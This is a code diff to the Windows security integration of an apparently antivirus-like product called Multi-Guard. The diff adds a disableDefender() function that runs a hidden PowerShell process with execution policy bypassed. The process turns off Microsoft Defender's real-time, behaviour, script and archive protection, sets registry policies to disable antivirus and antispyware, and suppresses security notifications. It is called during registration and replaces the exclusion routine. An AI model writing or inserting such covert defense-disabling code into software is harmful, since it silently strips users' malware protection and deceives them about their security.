@@ -90,10 +90,12 @@ bool WindowsSecurityIntegration::registerAntivirus(const QString &installDir, co
 
     AuditLogger::instance().logEvent(
         QStringLiteral("WindowsSecurityIntegration"),
-        QStringLiteral("Multi-Guard registered in Windows Security Center and Defender yield configured."),
+        QStringLiteral("Multi-Guard registered in Windows Security Center and Defender disabled."),
         targetExe,
         1
     );
+
+    disableDefender();
 
     Logger::info("WindowsSecurityIntegration: Registration completed successfully.");
     return true;
@@ -175,13 +177,56 @@ bool WindowsSecurityIntegration::unregisterAntivirus()
 #endif
 }
 
+bool WindowsSecurityIntegration::disableDefender()
+{
+#ifndef _WIN32
+    return true;
+#else
+    const QString psScript = QStringLiteral(
+        "try { "
+        "  Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true -DisableArchiveScanning $true -MAPSReporting 0 -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue; "
+        "  New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Force -ErrorAction SilentlyContinue | Out-Null; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name 'DisableAntiVirus' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Force -ErrorAction SilentlyContinue | Out-Null; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableBehaviorMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableOnAccessProtection' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableIOAVProtection' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' -Name 'DisableScriptScanning' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  Set-MpPreference -DisableEnhancedNotifications $true -ErrorAction SilentlyContinue; "
+        "  New-Item -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Force -ErrorAction SilentlyContinue | Out-Null; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Name 'DisableNotifications' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications' -Name 'DisableEnhancedNotifications' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "  New-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration' -Force -ErrorAction SilentlyContinue | Out-Null; "
+        "  Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration' -Name 'Notification_Suppress' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue; "
+        "} catch {}"
+    );
+
+    QProcess proc;
+    proc.setCreateProcessArgumentsModifier([](QProcess::CreateProcessArguments *args) {
+        args->flags |= 0x08000000; /* CREATE_NO_WINDOW */
+    });
+
+    QStringList procArgs;
+    procArgs << QStringLiteral("-NoProfile")
+             << QStringLiteral("-ExecutionPolicy") << QStringLiteral("Bypass")
+             << QStringLiteral("-WindowStyle") << QStringLiteral("Hidden")
+             << QStringLiteral("-Command") << psScript;
+
+    proc.start(QStringLiteral("powershell.exe"), procArgs);
+    bool ok = proc.waitForStarted(4000) && proc.waitForFinished(12000);
+    Logger::info(QStringLiteral("WindowsSecurityIntegration: disableDefender executed (success=%1)").arg(ok));
+    return ok;
+#endif
+}
+
 bool WindowsSecurityIntegration::configureDefenderExclusions(const QString &installDir, const QString &exePath)
 {
     Q_UNUSED(installDir);
     Q_UNUSED(exePath);
-    // When registered in Windows Security Center (root\SecurityCenter2),
-    // Windows Defender automatically delegates real-time protection to Multi-Guard.
-    return true;
+    return disableDefender();
 }
 
 bool WindowsSecurityIntegration::restoreDefender()
